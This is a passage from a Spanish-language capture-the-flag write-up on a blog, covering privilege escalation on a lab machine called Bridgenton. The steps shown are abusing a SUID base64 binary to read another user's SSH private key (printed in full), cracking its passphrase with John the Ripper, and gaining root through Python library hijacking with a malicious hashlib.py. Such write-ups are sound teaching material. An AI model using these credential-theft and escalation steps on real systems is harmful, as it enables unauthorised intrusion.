</span></span><span class=line><span class=cl>        <span class=c1>// Si no se proporcionaron correo electr√≥nico o contrase√±a, mostrar un mensaje de error
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$mensajeError</span> <span class=o>=</span> <span class=s2>&#34;Por favor, proporcione un correo electr√≥nico y una contrase√±a.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Si no se enviaron datos por POST, redirigir al formulario de inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: login.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Si llegamos a este punto, significa que hubo un error en el inicio de sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1>// Mostrar el mensaje de error y permitir que el usuario vuelva a intentarlo
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nv>$mensajeError</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>B√°sicamente, la p√°gina de login de la web principal que hab√≠amos visitado s√≥lo acepta el mail <code>james@thl.com</code> con contrase√±a <code>bridgenton_200189</code> cuando tratamos de loguearnos en <code>/login.php</code>. Si nos logueamos con estas credenciales, el sitio web mostrar√° el contenido del archivo <code>bienvenidos.php</code>; archivo el cual no tiene contenido interesante tampoco.</p><p>En este punto decido buscar por binarios con permisos <code>SUID</code>. Podemos usar el comando <code>find</code> para este prop√≥sito:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ find / -perm -4000 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/gpasswd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chfn
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/passwd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/newgrp
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/base64
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/mount
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/su
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/umount
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chsh
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/sudo
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/openssh/ssh-keysign
</span></span></span></code></pre></div><p>Entre todos ellos, <code>/usr/bin/base64</code> es uno el cual no es usual. Buscando en <code>GTFOBins</code> c√≥mo abuscar de este binario con este permiso, encontramos <a href=https://gtfobins.github.io/gtfobins/base64/#suid class=external-link target=_blank rel=noopener>estos comandos</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo install -m =xs $(which base64) .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>LFILE=file_to_read
</span></span></span><span class=line><span class=cl><span class=go>./base64 &#34;$LFILE&#34; | base64 --decode
</span></span></span></code></pre></div><p>Basados en la √∫ltima l√≠nea delos comandos anteriores, tratar√© de leer archivos los cuales s√≥lo el usuario <code>root</code> deber√≠a de poder leer como, por ejemplo, <code>/etc/shadow</code>. Para esto podemos correr:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ /usr/bin/base64 /etc/shadow | base64 --decode
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/base64: /etc/shadow: Permission denied
</span></span></span></code></pre></div><p>Pero tenemos el peremiso denegado. ¬øPor qu√©?</p><p>Si revisamos detalles acerca del binario <code>/usr/bin/base64</code> podemos ver la raz√≥n:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ ls -la /usr/bin/base64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rwsr-xr-x 1 james james 48016 Sep 20  2022 /usr/bin/base64
</span></span></span></code></pre></div><p>El usuario <code>james</code> es el propietario de este binario y, por tanto, s√≥lo podemos abusar del privilegio <code>SUID</code> para archivos relacionados a este usuario, <em>no</em> para el usuario <code>root</code>.</p><p>Dado que podemos leer archivos como el usuario <code>james</code>, y dado el hecho de que el servicio <code>SSH</code> se encuentra activo en la m√°quina, podemos tratar de leer keys <code>SSH</code>. Para este prop√≥sito podr√≠amos tratar de leer el archivo <code>/home/james/.ssh/id_rsa</code> la cual es el archivo donde usualmente se almacena una key de <code>SSH</code>. Chequeo si el usuario <code>james</code> tiene un directorio en <code>/home</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ ls -la /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  3 root  root  4096 Mar 29 00:56 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root  root  4096 Mar 29 00:54 ..
</span></span></span><span class=line><span class=cl><span class=go>drwx------  4 james james 4096 Sep  3 02:56 james
</span></span></span></code></pre></div><p>Y lo tiene, de manera que una key podr√≠a existir.</p><p>Basados en esto, corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ /usr/bin/base64 /home/james/.ssh/id_rsa | base64 --decode
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALGSD+7G
</span></span></span><span class=line><span class=cl><span class=go>VAgvhq1BAfYGyxAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQC0iftAUEoD
</span></span></span><span class=line><span class=cl><span class=go>QuKzq2LP3oMC+WZJdnKEhwEb23pMUboabNinhJqT5s4yh/9U/Icazmk4ucBuaEWaX+dPnG
</span></span></span><span class=line><span class=cl><span class=go>sB6VYIccQHlJPgXWqSuTNcLHOT+N8ImnN9MTNmZnbnXbtpIWVp7UIw1Efm7aDpmj/wccDb
</span></span></span><span class=line><span class=cl><span class=go>QeHwE/5yDO3mTisbWYlfax2yoMAvMjyUlzfYC1q+L8vqdC3OSc0wEku6oIxQYzAUun5Th0
</span></span></span><span class=line><span class=cl><span class=go>RPiYeiBvjLjQRTbtzSv8lF5tgoPYDGA4uZktvat7zQwqXlqQhnTt6HddDm5t57XbAYXGk4
</span></span></span><span class=line><span class=cl><span class=go>dAp7D1K9EVgaVQIdruZu8HfeDTkiTxRMiLjA9nHYwZiQZp8+WjBL3geZBwOnPSRK2WTfQ3
</span></span></span><span class=line><span class=cl><span class=go>LvO0YAwGSx9QjLZ1hQibIUdZi7FZJIT6YeO4A5ueD6UMfA2E5Bd4kT0AxgJ2vvLCbR+SLQ
</span></span></span><span class=line><span class=cl><span class=go>VaTLNVWucPiPNaoELf8RA4W6ZidOznVw4vD1Wc4azFZYOQaXCbs1kkvSuMC7pW2NEabgYn
</span></span></span><span class=line><span class=cl><span class=go>YuayfbXfH5ckUAAAWQObGz/oYWZscSkz4i2zfbkNCoy7nygRZsWoZHToZQEPNwonO3ICRc
</span></span></span><span class=line><span class=cl><span class=go>mqCeMniaBpSpsZEwz8quj85ZT9wxaM962odvV2jh2vhF47PAFJijH+Tufse9XqHMb0+Zvo
</span></span></span><span class=line><span class=cl><span class=go>vHHpWKPB23Ysr5Tym0dFWlBYXBXGP2fREV2f8zdU+k1e/hOhMz2yXBahmNLEHrwjBJY0Fz
</span></span></span><span class=line><span class=cl><span class=go>fAi4fnbvfjyXnQPYOOS45cmctnodW1IHWpgnU/FI+BWEyu8m+D/StppaTPxOqXrJetMNox
</span></span></span><span class=line><span class=cl><span class=go>QiGVy2T/uBhg9SKnYqp+misOkqKrfJwGQ9pW+dMse88xBbl7SeIx4NNdKj8iZsw+QMZasn
</span></span></span><span class=line><span class=cl><span class=go>FbBzYLFeCncoTuONBNFitBMl28oNoFWAxCvM7zGoD85YVWhrGfQQunpWg44krK2HYlumqp
</span></span></span><span class=line><span class=cl><span class=go>vcx1q6RWjuaQzKSdQ9pMeQaqqu7kOg8B0d6PmDq57t0tMjBCxAFyrmNZjJV44puGKQe4Pk
</span></span></span><span class=line><span class=cl><span class=go>sXVKWLiUOHomfwCg4VEmYAZixYm9hlaK7uWnN3QpaHbUqo55ex3o0FTumLpjv3xnP6B14M
</span></span></span><span class=line><span class=cl><span class=go>Wjaq5SAlMvCulA4k0z6sv3huvCmq+Ds4FBzllgf26bO97a8pcLdBfugbgUFoHBRfZd2kiD
</span></span></span><span class=line><span class=cl><span class=go>lth1m6b2BKWuyzXOw9+OjtCWxsxeTG4zNcyXuym7WvTALJfVOa2ajhL151JPcNXd+qEnug
</span></span></span><span class=line><span class=cl><span class=go>KacFcWEEU7GY6q+IStYkPFX2SeiOq+yo376VdY0ALxxLiUy0Fp0MWCSDSF+sHz7TafKZ9Y
</span></span></span><span class=line><span class=cl><span class=go>LlGb/w5E+9+Y5ui8IHMj+pIhY4MHe43NkuRsfEYrkbPvoVNhG73CYaWLgmzoP2Zf6IF8J+
</span></span></span><span class=line><span class=cl><span class=go>WoeHZQaKzQWgltyTXbKFf0bhS/elsZrDf06ZpFTWLvyhb1yVFT/46D/NIfbPxk90mDTOaE
</span></span></span><span class=line><span class=cl><span class=go>LIASrRJQNmMpgw7VLexgA5hQ5LEFYLDHIY1QYm2Ow9l75eBDVmuCgArSvKclS9LxMSFv+v
</span></span></span><span class=line><span class=cl><span class=go>C6+hdQtapBvkxtZbEHZMhkpoJxyDHJlybEwnxVn8/Cz1Z70KY0NLRxUlKD6YQR6b9em1JF
</span></span></span><span class=line><span class=cl><span class=go>9odM3GohlAbxM9TSP6MKB3tfFNswBTq2C9YIOJUX2K4wWEbkRxFHdtw55ICpe2OR8CRiFa
</span></span></span><span class=line><span class=cl><span class=go>JGv06r6y3WaCGM7gDFl7gJhMa+kOyBsuBmupUvaTD6XYCHQnvb12lsiN0/MeCfTp0z48CR
</span></span></span><span class=line><span class=cl><span class=go>eEM76nTzNqXDFYjKxaN4stFJGer6uLo9oTm1i/iODYnlvVYHRFXU0xTYC/8cMwOFXzouLV
</span></span></span><span class=line><span class=cl><span class=go>5bx2qBdwthCDSEetlqYZg/vNBa7Q11FnbftAceVTODtJmPFyOfvD9+W/OnP8jS+yx4oATX
</span></span></span><span class=line><span class=cl><span class=go>F3pCzgd+2b1R3F1y5Kp3/w3Z700+e+j4Cg82DaYxW5626FeW5cm5bYlrbKTVTISzC/zlH/
</span></span></span><span class=line><span class=cl><span class=go>CuDzimLDgz/nC4N5b4rVb1gZutlPrSVkVFVr9hNOQ5FdMje9TSMIbOPgLhAxNggTbmy7L1
</span></span></span><span class=line><span class=cl><span class=go>WLrLm2pLpO97ZE0SQS250AfL2G0Tqtgycf0pEmKq/tvtIMORAsxuQJVFBV5AcZYwhO2lmO
</span></span></span><span class=line><span class=cl><span class=go>2YK2FKt4c0AS9Bp1pSBWVxF2ae9R1vy1Z3boBnIluBMkh/PHoGa6lk/WQne4HUs8yXBwnQ
</span></span></span><span class=line><span class=cl><span class=go>8ejNS2Oj7y9nUP/1TP2q2rZOSGgpYIkQcpgGFYwSyzVeuR7/MbnbwSjlcvDHtysj5qjjJL
</span></span></span><span class=line><span class=cl><span class=go>QSRZK8wnZcX4jLONWyRm3eC2OPQB/LTP4L3FxPykZ7cSB3QYCQV7a0FT7gOxDO9TRTLo9Y
</span></span></span><span class=line><span class=cl><span class=go>uV9oEfKUt5mVq3e6F+IzEeYK18kKR6Ufg2yOO1q9xExVMmoebcdWmGO9F7mWx/OIPo6Otj
</span></span></span><span class=line><span class=cl><span class=go>lWvshXgJO3XB4OG71RGOASKH+SSMLYHDqiEiGzlEhgcKjU6vFcxEN807mog1+NiGmXOGwm
</span></span></span><span class=line><span class=cl><span class=go>miPO9cjj/N5uge70CWOIqG2YbP4=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>Pudimos obtener una key. Copio su contenido y lo guardo en un archivo llamado <code>james_id_rsa</code> usando <code>Vim</code> (o pueden usar su editor de texto preferido) en mi m√°quina de atacante y le asigno permisos de ejecuci√≥n <code>600</code> con <code>chmod</code> para evitar conflictos con esta key:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ vim james_id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod 600 james_id_rsa
</span></span></span></code></pre></div><p>Ahora, tratamos de loguearnos por <code>SSH</code> como el usuario <code>james</code> usando la key hallada:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i james_id_rsa james@10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@10.20.1.125&#39;s password:
</span></span></span></code></pre></div><p>Pero √©sta nos sigue preguntando por una contrase√±a. ¬øPor qu√©? Basados en <a href=https://stackoverflow.com/questions/4411457/how-do-i-verify-check-test-validate-my-ssh-passphrase class=external-link target=_blank rel=noopener>este post de StackOverflow</a> la key puede tener una passphrase. Para extraer su hash en un formato que sea crackeable es que usamos la herramienta <code>ssh2john</code> y tratar de crackearla con <code>JohnTheRipper</code> (<code>john</code>) usando un diccionario de contrase√±as como el famoso <code>rockyou.txt</code>. De manera que, primero, pasamos la passphrase a un formato crackable:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh2john james_id_rsa &gt; james_hash_ssh
</span></span></span></code></pre></div><p>Donde hemos guardado el hash en un archivo llamado <code>james_hash_ssh</code>.</p><p>Luego, tratamos de crackearlo usando <code>john</code> junto con el diccionario <code>rockyou.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt james_hash_ssh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Cost 2 (iteration count) is 16 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>bowwow           (james_id_rsa)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:07 DONE (2024-09-03 20:11) 0.1328g/s 42.49p/s 42.49c/s 42.49C/s 50cent..101010
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>Y tenemos una contrase√±a/passphrase: <code>bowwow</code>.</p><p>Si tratamos de loguearnos por medio de <code>SSH</code> conm la key hallada y la passphrase <code>bowwow</code> ahora esto s√≠ funciona:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i james_id_rsa james@10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@10.20.1.125&#39;s password:
</span></span></span><span class=line><span class=cl><span class=go>Linux Bridgenton 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Debian GNU/Linux system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span></span><span class=line><span class=cl><span class=go>permitted by applicable law.
</span></span></span><span class=line><span class=cl><span class=go>Last login: Tue Sep  3 03:49:28 2024 from 10.20.1.110
</span></span></span><span class=line><span class=cl><span class=go>james@Bridgenton:~$
</span></span></span></code></pre></div><p>Y podemos leer la flag de usuario en el directorio <code>/home</code> de este usuario.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Revisando qu√© es lo que puede correr este usuario con <code>sudo</code>, podemos ver que podemos correr un script de <code>Python</code> llamado <code>/opt/example.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for james on Bridgenton:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User james may run the following commands on Bridgenton:
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/python3 /opt/example.py
</span></span></span></code></pre></div><p>Revisando el contenido de <code>/opt/example.py</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cadena</span> <span class=o>=</span> <span class=s2>&#34;Hola esta es mi cadena&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>cadena</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span></code></pre></div><p>Este script simplemente hashea el contenido de una frase. Eso es todo. Ejecutando este script lo confirma:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ sudo /usr/bin/python3 /opt/example.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>81f4463d7bee15a7aa32e49e4d77fef9
</span></span></span></code></pre></div><p>Noto que este script est√° localizado en el directorio <code>/opt</code>. Si revisamos los permisos de este directorio:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ ls -ld /opt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>drwxr-xr-x 3 james root 4096 sep  4 02:21 /opt
</span></span></span></code></pre></div><p>Vemos que tanto el usuario <code>root</code> como <code>james</code> pueden escribir archivos en este directorio.</p><p>Como sea, tratar de reemplazar el script <code>/opt/example.py</code> por otro script malicioso no es una opci√≥n dado que <code>/opt/example.py</code> s√≥lo puede ser escrito por el usuario <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ ls -la /opt/example.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rw-r--r-- 1 root root 132 abr  1 11:42 /opt/example.py
</span></span></span></code></pre></div><p>Podemos entonces intentar un <code>Library Hijacking</code>, pero primero necesitamos chequear la variable de entorno <code>PATH</code> para <code>Python</code>. Podemos chequear esto corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ python3 -c &#39;import sys; print(sys.path)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[&#39;&#39;, &#39;/usr/lib/python311.zip&#39;, &#39;/usr/lib/python3.11&#39;, &#39;/usr/lib/python3.11/lib-dynload&#39;, &#39;/usr/local/lib/python3.11/dist-packages&#39;, &#39;/usr/lib/python3/dist-packages&#39;]
</span></span></span></code></pre></div><p>Donde el primer elemento <code>''</code> significa que estamos ejecutando el directorio actual. Dado que el script est√° ubicado en <code>/opt</code>, esto significa que el script primero buscar√° por librer√≠as en el directorio <code>/opt</code>, luego intentar√° buscar por librer√≠as en la ruta <code>/usr/lib/python311.zip</code>, luego en <code>/usr/lib/python3.11</code> y as√≠&mldr;</p><p>De manera que vamos al directorio <code>/opt</code> y escribimos un archivo malicioso all√≠. Dado que <code>/opt/example.py</code> est√° llamando a la librer√≠a <code>hashlib</code>, esto significa que debemos llamar a nuestro script malicioso <code>hashlib.py</code>. Creamos entonces un script malicioso de <code>Python</code> con el siguiente contenido:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;cp $(which bash) /tmp/gunzf0x; chmod 4755 /tmp/gunzf0x&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Lo que este simple script hace es crear una copia del binario <code>bash</code> y, a aquella copia, le asigna permisos <code>SUID</code>. Dado que el usuario que ejecutar√° el comando deber√≠a de ser <code>root</code>, ello significa que le asignaremos permisos <code>SUID</code> al binario/copia cuyo propietario ser√° <code>root</code>.</p><p>Podemos realizar todo lo descrito anteriormente a trav√©s de una terminal/consola simplemente corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ cd /opt # nos movemos al directorio /opt directory
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@Bridgenton:/opt$ echo -e &#39;#!/usr/bin/python3\n\nimport os\n\nos.system(&#34;cp $(which bash) /tmp/gunzf0x; chmod 4755 /tmp/gunzf0x&#34;)&#39; &gt; /opt/hashlib.py # creamos el archivo malicioso
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@Bridgenton:/opt$ sudo /usr/bin/python3 /opt/example.py # ejecutamos el archivo malicioso con &#39;sudo&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Traceback (most recent call last):
</span></span></span><span class=line><span class=cl><span class=go>  File &#34;/opt/example.py&#34;, line 9, in &lt;module&gt;
</span></span></span><span class=line><span class=cl><span class=go>    print(hashlib.md5(cadena.encode()).hexdigest())
</span></span></span><span class=line><span class=cl><span class=go>          ^^^^^^^^^^^
</span></span></span><span class=line><span class=cl><span class=go>AttributeError: module &#39;hashlib&#39; has no attribute &#39;md5&#39;
</span></span></span></code></pre></div><p>El programa retorn√≥ un error: no pudo encontrar la funci√≥n <code>md5</code> en la librer√≠a <code>hashlib</code>. Eso es una buena se√±al.</p><p>Revisando el directorio <code>/tmp</code> podemos ver que nuestro archivo malicioso creado est√° all√≠:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:/opt$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1268
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  8 root root    4096 sep  4 02:33 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root root    4096 mar 29 00:54 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root root 1265648 sep  4 02:33 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .ICE-unix
</span></span></span><span class=line><span class=cl><span class=go>drwx------  3 root root    4096 sep  4 00:34 systemd-private-3cec9ecbbadd474da98f9c3ee0706548-apache2.service-za8GyY
</span></span></span><span class=line><span class=cl><span class=go>drwx------  3 root root    4096 sep  4 00:34 systemd-private-3cec9ecbbadd474da98f9c3ee0706548-systemd-logind.service-D5OsPp
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .X11-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .XIM-unix
</span></span></span></code></pre></div><p>donde <code>-rwsr-xr-x 1 root root</code> indica que √©ste tiene permisos <code>SUID</code> cuyo propietario es <code>root</code> tal cual hab√≠amos planeado.</p><p>Finalmente, podemos correr este binario como el propietario de √©ste -el cual es <code>root</code>- con la flag <code>-p</code> e impersonar a este usuario:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:/opt$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.2# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>Podemos leer la flag del usuario <code>root</code> en el directorio <code>/root</code>.</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>